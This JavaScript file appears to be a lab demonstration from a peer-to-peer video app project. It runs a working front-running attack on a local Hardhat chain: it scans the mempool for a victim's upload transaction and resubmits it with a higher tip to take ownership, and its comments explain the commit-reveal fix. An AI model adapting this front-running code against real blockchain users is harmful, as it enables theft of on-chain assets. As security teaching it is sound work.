// Front-running attack - THROUGH THE API (attacks the whole application).
//
// The VICTIM uploads a video the normal way: POST /upload. The backend signs and
// broadcasts uploadVideo(cid, price) to the PUBLIC mempool (server.js). The ATTACKER
// does not touch the server at all; like any node observer it watches the mempool,
// reads the pending CID, and submits its own uploadVideo(cid) with a higher priority
// fee (tip). The node orders the mempool by tip, so the attacker is mined first and
// takes permanent ownership of the CID; the victim's upload then reverts (500).
//
// On a real network the ~12s block time is the front-running window. The local
// Hardhat node mines instantly (automining), so the script turns automining off to
// recreate the same "two transactions pending together" condition, then mines.
// The script simply runs the attack and reports the outcome.
//
// REQUIRES THE FULL STACK RUNNING:
//   1. PostgreSQL with the peerplay DB + schema (P2P App/app/schema.sql)
//   2. npx hardhat node          (in P2P App/contract)
//   3. deploy the contract       (npx hardhat run scripts/deploy.js --network localhost)
//   4. fill P2P App/app/config.js (COTRACT_ADDRESS + WALLET_PRIVATE_KEYS)
//   5. the server                (npm start in P2P App/app)  ->  http://localhost:3001
//
// Run:  node attacks/frontrun-api.js      (from P2P App/app, Node 18+ for global fetch)

import * as ethers from "ethers";

const BASE = "http://localhost:3001";
const RPC = "http://127.0.0.1:8545";
const CONTRACT = "0x5FbDB2315678afecb367f032d93F642f64180aa3";

// Hardhat account #5 - deliberately OUTSIDE the server's custodial pool (accounts
// #0-#4 in config.js WALLET_PRIVATE_KEYS), so the attacker's wallet can never be the
// same account as the victim's server-assigned wallet.
const ATTACKER_KEY = "0x8b3a350cf5c34c9194ca85829a2df0ec3153be0318b5e2d3348e872092edffba";

const ABI = [
  "function uploadVideo(string,uint256)",
  "function videos(string) view returns (string ipfsHash, address owner, uint256 price, bool isAvailable)",
];

const stamp = Date.now(); // unique bytes (and thus CID) + filename per run
const b64 = (s) => Buffer.from(s).toString("base64");
const gwei = (n) => ethers.parseUnits(String(n), "gwei");
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

async function req(method, path, body, token) {
  return fetch(BASE + path, {
    method,
    headers: {
      "Content-Type": "application/json",
      ...(token ? { Authorization: "Bearer " + token } : {}),
    },
    body: body === undefined ? undefined : JSON.stringify(body),
  });
}

async function login(username, password) {
  await req("POST", "/register", { username, password }); // ignore 409 on re-run
  const res = await req("POST", "/login", { username, password });
  const data = await res.json();
  if (!data.token) throw new Error(`login failed for ${username}: ${JSON.stringify(data)}`);
  return data.token;
}

const provider = new ethers.JsonRpcProvider(RPC);
const attacker = new ethers.Wallet(ATTACKER_KEY, provider);
const iface = new ethers.Interface(ABI);
const contract = new ethers.Contract(CONTRACT, ABI, attacker);

// Scan the pending mempool for the victim's uploadVideo(...) transaction and return
// its decoded arguments. This is exactly what a front-runner does.
async function readPendingUpload(timeoutMs = 20000) {
  const deadline = Date.now() + timeoutMs;
  while (Date.now() < deadline) {
    const blk = await provider.send("eth_getBlockByNumber", ["pending", true]);
    for (const tx of blk?.transactions || []) {
      if (!tx.to || tx.to.toLowerCase() !== CONTRACT.toLowerCase()) continue;
      try {
        const parsed = iface.parseTransaction({ data: tx.input || tx.data, value: tx.value });
        if (parsed && parsed.name === "uploadVideo") return parsed;
      } catch { /* not an uploadVideo tx */ }
    }
    await sleep(500);
  }
  throw new Error("victim's uploadVideo never appeared in the mempool");
}

async function main() {
  console.log("=== Front-running - attack through the API ===\n");

  const token = await login("victim", "victim123");
  console.log("Registered + logged in: victim");
  console.log("Attacker wallet:", attacker.address, "(not a custodial account)\n");

  const filename = "victimVideo_" + stamp;
  const content = "victim-original-video-" + stamp;

  let uploadPromise;
  try {
    // Recreate the real-network window: let both transactions sit in the mempool.
    await provider.send("evm_setAutomine", [false]);

    // Victim uploads through the API. Do NOT await - the server will broadcast the tx
    // and then block on tx.wait() (nothing is mined yet), so the HTTP response is
    // pending until we mine below.
    console.log("Victim calls POST /upload (backend broadcasts uploadVideo to the mempool) ...");
    uploadPromise = req("POST", "/upload", { file: b64(content), filename }, token);

    // Attacker watches the mempool and reads the pending CID.
    const parsed = await readPendingUpload();
    const cid = parsed.args[0];
    const price = parsed.args[1];
    console.log(`Attacker read the pending CID from the mempool: ${cid}`);

    // Attacker front-runs with a higher tip.
    console.log("Attacker submits uploadVideo(cid) directly with tip = 100 gwei ...");
    const atx = await contract.uploadVideo(cid, price, {
      maxPriorityFeePerGas: gwei(100), maxFeePerGas: gwei(200), gasLimit: 300000,
    });

    // Mine: attacker (higher tip) is ordered first and wins; the victim's tx reverts.
    for (let i = 0; i < 6; i++) {
      await provider.send("evm_mine", []);
      if (await provider.getTransactionReceipt(atx.hash)) break;
    }
    await provider.send("evm_mine", []); // flush the victim's now-reverting tx
    await provider.send("evm_setAutomine", [true]);

    const uploadRes = await uploadPromise;
    const owner = (await contract.videos(cid)).owner;

    console.log("\n--- Result ---");
    console.log("Victim POST /upload status:", uploadRes.status, uploadRes.status === 500 ? "(upload failed)" : "");
    console.log("On-chain owner of the CID :", owner, owner === attacker.address ? "(ATTACKER)" : "");
    if (owner === attacker.address) {
      console.log("\nAttack succeeded - the attacker stole the CID through the public mempool.");
      console.log("The victim's upload reverted; the attacker now owns the video on-chain.");
    } else {
      console.log("\nAttack failed - the victim kept ownership of the CID.");
    }
  } catch (e) {
    // Against the fixed (commit-reveal) backend, the victim first broadcasts an opaque
    // commitVideo(hash) - there is no plaintext uploadVideo(cid) in the mempool to
    // copy - so the attacker finds nothing to front-run and readPendingUpload times out.
    const reason = (e.shortMessage || e.message || "").split("\n")[0];

    // Restore mining so the victim's still-pending upload (commit + reveal) completes.
    await provider.send("evm_setAutomine", [true]).catch(() => {});
    for (let i = 0; i < 3; i++) await provider.send("evm_mine", []).catch(() => {});
    const uploadRes = await uploadPromise?.catch(() => null);

    console.log("\n--- Result ---");
    console.log("Attack failed - the attacker had nothing to front-run.");
    console.log("Reason:", reason);
    if (uploadRes) {
      console.log("Victim POST /upload status:", uploadRes.status,
        uploadRes.status === 200 ? "(victim uploaded successfully, keeps ownership)" : "");
    }
    console.log("\nThe commit-reveal fix broadcasts an opaque commitVideo(hash) first, so a");
    console.log("mempool watcher sees no CID to copy. The reveal is bound to the victim's");
    console.log("address, so even copying it later cannot transfer ownership.");
  }
}

main().catch((e) => { console.error(e); process.exitCode = 1; });
